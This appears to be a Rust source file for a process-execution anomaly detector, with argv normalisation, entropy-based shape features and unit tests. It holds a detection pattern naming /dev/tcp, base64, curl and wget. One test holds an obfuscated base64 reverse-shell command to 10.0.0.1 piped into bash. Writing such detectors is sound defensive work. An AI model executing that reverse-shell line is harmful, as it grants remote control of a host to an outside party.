pub mod config;
pub mod model;
pub mod stats;

pub use config::{Config, DecayedValue};
pub use model::{ExecEvent, OnlineScorer, ScoreBreakdown, make_event, make_event_from_strings};
pub use stats::{ExeProfile, FEATURE_DIM, FeatureVec, RunningCentroid, RunningStat, ShapeFeatures};

pub fn normalize_template_display(argv: &[String]) -> String {
    if argv.is_empty() {
        return "<EMPTY>".to_string();
    }

    let mut out = String::new();
    for (idx, tok) in argv.iter().take(6).enumerate() {
        if idx > 0 {
            out.push('|');
        }

        let normalized = if idx == 0 {
            basename(tok)
        } else if tok == "-c" {
            "-c"
        } else if tok == "-m" {
            "-m"
        } else if idx > 1 && argv.get(idx - 1).map(String::as_str) == Some("-c") {
            "<SHELL_SNIPPET>"
        } else if is_number(tok) {
            "<NUM>"
        } else if looks_like_url(tok) {
            "<URL>"
        } else if looks_like_ip(tok) {
            "<IP>"
        } else if looks_like_uuid(tok) {
            "<UUID>"
        } else if looks_like_long_hex(tok) {
            "<HEX>"
        } else if looks_like_long_base64ish(tok) {
            "<B64>"
        } else if tok.starts_with('/') {
            out.push_str("<PATH:");
            out.push_str(basename(tok));
            out.push('>');
            continue;
        } else {
            out.push_str(tok);
            continue;
        };
        out.push_str(normalized);
    }
    out
}

pub fn extract_shape_features(argv: &[String]) -> ShapeFeatures {
    let arg_count = argv.len();
    let mut cmd_len: usize = 0;
    let mut max_token_entropy: f32 = 0.0;
    let mut sum_token_entropy: f32 = 0.0;
    let mut suspicious_count: usize = 0;
    let mut shell_operator_count: usize = 0;

    for tok in argv {
        let bytes = tok.as_bytes();
        let len = bytes.len();
        cmd_len += len;

        let mut counts = [0u32; 256];
        let mut shell_ops: usize = 0;
        let mut all_hex = true;
        let mut all_b64 = true;

        for &b in bytes {
            counts[b as usize] += 1;
            match b {
                b'|' | b';' | b'>' | b'<' | b'&' | b'$' | b'`' => shell_ops += 1,
                _ => {}
            }
            if all_hex && !b.is_ascii_hexdigit() {
                all_hex = false;
            }
            if all_b64
                && !b.is_ascii_alphanumeric()
                && !matches!(b, b'+' | b'/' | b'=' | b'-' | b'_')
            {
                all_b64 = false;
            }
        }

        shell_operator_count += shell_ops;

        let entropy = if len == 0 {
            0.0
        } else {
            let flen = len as f32;
            let mut h: f32 = 0.0;
            for &c in &counts {
                if c > 0 {
                    let p = c as f32 / flen;
                    h -= p * p.log2();
                }
            }
            h
        };

        if entropy > max_token_entropy {
            max_token_entropy = entropy;
        }
        sum_token_entropy += entropy;

        let is_suspicious = (all_b64 && len >= 20)
            || (all_hex && len >= 16)
            || (entropy >= 4.3 && len >= 20)
            || contains_bytes(bytes, b"/dev/tcp/")
            || contains_bytes(bytes, b"base64")
            || contains_bytes(bytes, b"curl")
            || contains_bytes(bytes, b"wget");

        if is_suspicious {
            suspicious_count += 1;
        }
    }

    let mean_token_entropy = if arg_count == 0 {
        0.0
    } else {
        sum_token_entropy / arg_count as f32
    };
    let suspicious_token_fraction = if arg_count == 0 {
        0.0
    } else {
        suspicious_count as f32 / arg_count as f32
    };

    ShapeFeatures {
        arg_count,
        cmd_len,
        max_token_entropy,
        mean_token_entropy,
        suspicious_token_fraction,
        shell_operator_count,
    }
}

fn contains_bytes(haystack: &[u8], needle: &[u8]) -> bool {
    haystack.windows(needle.len()).any(|w| w == needle)
}

pub fn shannon_entropy(s: &str) -> f32 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts = [0u32; 256];
    for &b in s.as_bytes() {
        counts[b as usize] += 1;
    }
    let len = s.len() as f32;
    let mut h: f32 = 0.0;
    for &c in &counts {
        if c == 0 {
            continue;
        }
        let p = c as f32 / len;
        h -= p * p.log2();
    }
    h
}

#[inline]
pub const fn clamp01(x: f32) -> f32 {
    x.clamp(0.0, 1.0)
}

#[inline]
pub fn rarity(weight: f32) -> f32 {
    1.0 / (weight + 1.0).sqrt()
}

#[inline]
pub fn stable_hash(s: &str) -> u64 {
    xxhash_rust::xxh3::xxh3_64(s.as_bytes())
}

#[inline]
pub fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

#[inline]
pub fn is_number(s: &str) -> bool {
    !s.is_empty() && s.as_bytes().iter().all(u8::is_ascii_digit)
}

#[inline]
pub fn looks_like_url(s: &str) -> bool {
    s.starts_with("http://") || s.starts_with("https://")
}

pub fn looks_like_ip(s: &str) -> bool {
    let mut parts = s.split('.');
    matches!(
        (
            parts.next(),
            parts.next(),
            parts.next(),
            parts.next(),
            parts.next(),
        ),
        (Some(a), Some(b), Some(c), Some(d), None)
            if a.parse::<u8>().is_ok()
                && b.parse::<u8>().is_ok()
                && c.parse::<u8>().is_ok()
                && d.parse::<u8>().is_ok()
    )
}

#[inline]
pub fn looks_like_uuid(s: &str) -> bool {
    let bytes = s.as_bytes();
    bytes.len() == 36
        && bytes[8] == b'-'
        && bytes[13] == b'-'
        && bytes[18] == b'-'
        && bytes[23] == b'-'
}

#[inline]
pub fn looks_like_long_hex(s: &str) -> bool {
    s.len() >= 16 && s.as_bytes().iter().all(u8::is_ascii_hexdigit)
}

#[inline]
pub fn looks_like_long_base64ish(s: &str) -> bool {
    s.len() >= 20
        && s.as_bytes()
            .iter()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_'))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn template_collapses_python_http_server_port() {
        let a = vec![
            "python3".to_string(),
            "-m".to_string(),
            "http.server".to_string(),
            "8080".to_string(),
        ];
        let b = vec![
            "python3".to_string(),
            "-m".to_string(),
            "http.server".to_string(),
            "9000".to_string(),
        ];
        assert_eq!(
            normalize_template_display(&a),
            normalize_template_display(&b)
        );
    }

    #[test]
    fn repeated_ssm_ps_cools_down() {
        let mut scorer = OnlineScorer::new(Config::default());
        let base = 1_700_000_000u64;

        let first = make_event(
            base,
            "root",
            "amazon-ssm-agent",
            "ps",
            &["ps", "-eo", "pid,ppid,cmd"],
        );
        let s1 = scorer.score_event(&first);
        assert!(s1.final_score > 0.40, "first score too low: {:?}", s1);

        for i in 0..10 {
            let ev = make_event(
                base + 60 * (i + 1),
                "root",
                "amazon-ssm-agent",
                "ps",
                &["ps", "-eo", "pid,ppid,cmd"],
            );
            scorer.learn_benign(&ev);
        }

        let later = make_event(
            base + 60 * 11,
            "root",
            "amazon-ssm-agent",
            "ps",
            &["ps", "-eo", "pid,ppid,cmd"],
        );
        let s2 = scorer.score_event(&later);
        assert!(
            s2.final_score < s1.final_score,
            "later should cool down: {:?} vs {:?}",
            s2,
            s1
        );
        assert!(
            s2.final_score < 0.30,
            "later score still too high: {:?}",
            s2
        );
    }

    #[test]
    fn root_python_http_server_scores_high() {
        let mut scorer = OnlineScorer::new(Config::default());
        let base = 1_700_000_000u64;

        for i in 0..8 {
            let ev = make_event(
                base + i * 60,
                "root",
                "amazon-ssm-agent",
                "ps",
                &["ps", "-eo", "pid,ppid,cmd"],
            );
            scorer.learn_benign(&ev);
        }

        let ev = make_event(
            base + 3600,
            "root",
            "bash",
            "python3",
            &["python3", "-m", "http.server", "8080"],
        );
        let s = scorer.score_event(&ev);
        assert!(
            s.s_parent_child > 0.6,
            "parent-child should be rare: {:?}",
            s
        );
        assert!(
            s.s_parent_template > 0.6,
            "parent-template should be rare: {:?}",
            s
        );
        assert!(s.final_score > 0.55, "score too low: {:?}", s);
    }

    #[test]
    fn user_context_is_lighter_than_parent_child() {
        let mut scorer = OnlineScorer::new(Config::default());
        let base = 1_700_000_000u64;

        for i in 0..8 {
            let ev = make_event(
                base + i * 60,
                "root",
                "trusted-wrapper",
                "python3",
                &["python3", "--version"],
            );
            scorer.learn_benign(&ev);
        }

        let ev = make_event(
            base + 3600,
            "root",
            "bash",
            "python3",
            &["python3", "-m", "http.server", "8080"],
        );
        let s = scorer.score_event(&ev);
        assert!(
            s.s_user_exe < s.s_parent_child,
            "parent-child should dominate user context: {:?}",
            s
        );
    }

    #[test]
    fn ugly_shell_blob_gets_shape_signal() {
        let mut scorer = OnlineScorer::new(Config::default());
        let base = 1_700_000_000u64;

        for i in 0..6 {
            let ev = make_event(
                base + i * 60,
                "root",
                "bash",
                "bash",
                &["bash", "-c", "echo hi"],
            );
            scorer.learn_benign(&ev);
        }

        let ev = make_event(
            base + 7200,
            "root",
            "bash",
            "bash",
            &[
                "bash",
                "-c",
                "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash",
            ],
        );
        let s = scorer.score_event(&ev);
        assert!(
            s.s_shape_deviation > 0.0 || s.final_score > 0.3,
            "ugly shell blob should not look boring: {:?}",
            s
        );
    }

    #[test]
    fn medium_score_requires_repetition_before_learning() {
        let mut scorer = OnlineScorer::new(Config::default());
        let base = 1_700_000_000u64;

        let ev1 = make_event(base, "root", "amazon-ssm-agent", "ps", &["ps", "-ef"]);
        let s1 = scorer.observe(&ev1);
        assert!(s1.final_score >= 0.0);

        let key = ev1.template;
        let pending = scorer
            .pending_templates
            .get(&key)
            .copied()
            .unwrap_or_default();
        assert!(pending.count <= 1);
    }
}
